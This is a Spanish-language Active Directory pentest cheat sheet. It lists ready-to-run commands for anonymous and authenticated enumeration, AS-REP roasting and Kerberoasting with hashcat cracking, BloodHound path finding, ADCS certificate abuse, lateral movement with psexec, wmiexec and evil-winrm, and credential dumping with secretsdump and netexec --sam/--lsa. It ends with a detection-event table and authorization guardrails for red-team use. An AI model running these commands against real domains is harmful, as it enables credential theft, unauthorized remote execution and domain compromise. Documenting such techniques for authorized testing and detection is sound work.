# Active Directory — enumeración y ataque interno

> Requiere autorización escrita y un laboratorio o alcance explícito.

## Reconocimiento inicial

```bash
# DNS del dominio
nslookup -type=SRV _ldap._tcp.dc._msdcs.<dominio>
dig +short SRV _ldap._tcp.dc._msdcs.<dominio>

# SMB anónimo
enum4linux-ng -A <dc>
netexec smb <dc> -u '' -p '' --shares
smbclient -L //<dc>/ -N
```

## Credenciales válidas

```bash
netexec smb <rango> -u usuario -p 'clave' --shares
netexec smb <rango> -u usuario -p 'clave' --users
netexec smb <rango> -u usuario -p 'clave' --groups
netexec ldap <dc> -u usuario -p 'clave' --users
netexec winrm <host> -u usuario -p 'clave'
```

## Kerberos

```bash
# Usuarios sin preauth → AS-REP roast
impacket-GetNPUsers <dominio>/ -usersfile work/usuarios.txt -no-pass -format hashcat

# SPNs → Kerberoast
impacket-GetUserSPNs <dominio>/usuario:'clave' -request -outputfile work/tgs.txt
hashcat -m 13100 work/tgs.txt rockyou.txt
```

## BloodHound

```bash
bloodhound-python -u usuario -p 'clave' -d <dominio> -ns <dc> -c All
# importar el ZIP en BloodHound y buscar rutas a Domain Admin
```

## ADCS (Certificate Services)

```bash
certipy find -u usuario@<dominio> -p 'clave' -dc-ip <dc> -vulnerable
certipy req -u usuario@<dominio> -p 'clave' -ca <CA> -template <plantilla>
```

## Movimiento lateral (autorizado)

```bash
impacket-psexec <dominio>/usuario:'clave'@<host>
impacket-wmiexec <dominio>/usuario:'clave'@<host>
evil-winrm -i <host> -u usuario -p 'clave'
netexec smb <host> -u usuario -p 'clave' -x 'whoami'
```

## Volcado de credenciales (solo tras compromiso autorizado)

```bash
impacket-secretsdump <dominio>/usuario:'clave'@<host>
netexec smb <host> -u usuario -p 'clave' --sam
netexec smb <host> -u usuario -p 'clave' --lsa
```

## Detección (lado blue team)

| Técnica | Evento / señal |
|---|---|
| Kerberoasting | 4769 con `TicketEncryptionType 0x17` |
| AS-REP roasting | 4768 sin preauth |
| DCSync | 4662 con `DS-Replication-Get-Changes` |
| Pass-the-hash | 4624 tipo 3 con NTLM donde se espera Kerberos |
| Golden ticket | TGT con lifetime anómalo o cuenta inexistente |

## Guardrails

- Sin `secretsdump` ni `--sam` fuera de un host comprometido autorizado.
- Sin cambios de contraseña ni de grupos: solo lectura.
- Detenerse ante Domain Admin y reportar antes de continuar.
